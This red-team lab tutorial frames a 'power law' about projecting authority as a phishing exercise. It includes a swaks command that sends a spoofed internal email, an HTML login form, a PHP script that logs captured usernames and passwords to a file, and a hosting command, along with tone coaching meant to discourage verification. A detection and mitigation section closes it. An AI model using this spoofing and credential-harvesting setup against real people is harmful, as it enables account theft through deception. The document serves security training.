**Law 34 - Be Royal in Your Own Fashion: Act Like a King to Be Treated Like One**

Interpretation (offensive context):  
Project **high status and certainty** without explicitly stating authority. People defer to those who _behave_ like decision-makers. You induce compliance through **status signaling**, not formal hierarchy.

---

# 🎯 Attack Scenario — _Status Projection Phish (Implicit Authority → Compliance)_

You communicate with **calm certainty and decisiveness**, avoiding requests. The message reads like it comes from someone who is **used to being followed**.

**Persona:**

> _Alexandra Volkova_, 20 y/o Program Lead (implied seniority)

---

# 🔴 Red Team Objective

- Induce:
    
    - compliance via **status perception**
        
- Avoid:
    
    - explicit authority claims (which can be verified)
        
- Achieve:
    
    - credential capture through **implicit dominance**
        

---

# 🖥️ Lab Setup

### VMs:

- **Kali (Attacker)** — 3GB
    
- **Ubuntu Victim** — 2GB
    

### Network:

- Host-only
    

---

# ⚙️ Operator Workflow

## Phase 1 — Status-Based Communication Design

### Email:

```bash
swaks --to target@corp.local \
--from alexandra.v@corp.local \
--server 192.168.56.101 \
--data "Subject: Access alignment

Proceed with access confirmation here:

http://192.168.56.101:8080"
```

👉 Notice:

- no greeting
    
- no apology
    
- no explanation
    
- no “please”
    

This signals:

- authority
    
- confidence
    
- expectation of compliance
    

---

## Phase 2 — Tone Consistency

Optional follow-up:

> “This needs to be aligned today.”

👉 Reinforces:

- decisiveness
    
- control
    

---

## Phase 3 — Payload

```bash
mkdir royal && cd royal
```

```html
<form action="cap.php" method="POST">
<input name="user" placeholder="Email">
<input type="password" name="pass" placeholder="Password">
<button>Confirm</button>
</form>
```

```php
<?php
file_put_contents("creds.txt", $_POST['user']." ".$_POST['pass']."\n", FILE_APPEND);
?>
```

---

## Phase 4 — Hosting

```bash
php -S 0.0.0.0:8080
```

---

## Phase 5 — Execution

Target:

- perceives sender as senior
    
- avoids questioning
    
- complies
    

👉 Status replaces verification

---

# 🛠️ Tooling + Commands

### Delivery:

```bash
swaks --to target@corp.local --from alexandra.v@corp.local
```

### Hosting:

```bash
php -S 0.0.0.0:8080
```

### Capture:

```php
file_put_contents("creds.txt", ...)
```

---

# 🧠 Social Engineering Mapping (Hadnagy)

Relevant concepts:

- **Authority bias (implicit)**
    
- **Confidence signaling**
    
- **Behavior-driven trust**
    

Key principle:

> People obey those who act like they are in charge

---

# 🛡️ Detection & Defensive Insight

Indicators:

- directive messages without context
    
- absence of polite language
    
- action expected without explanation
    

Mitigation:

- train users:
    
    - “Confidence ≠ legitimacy”
        
- enforce:
    
    - verification even for senior-sounding requests
        
- monitor:
    
    - unusual directive-style communications
        

---

# 📄 Report Artifact

### Title:

> Credential Harvest via Implicit Authority and Status Projection

### Include:

- directive-style email
    
- tone analysis
    
- payload design
    
- credential capture
    
- analysis:
    
    - how status influenced compliance
        
- impact:
    
    - compromise via perceived authority
        

---

# ⚠️ Operator Insight

Beginners:

- try to prove authority
    

Operators:

- **project authority**
    

You don’t say you’re important  
You **behave like you are**

---

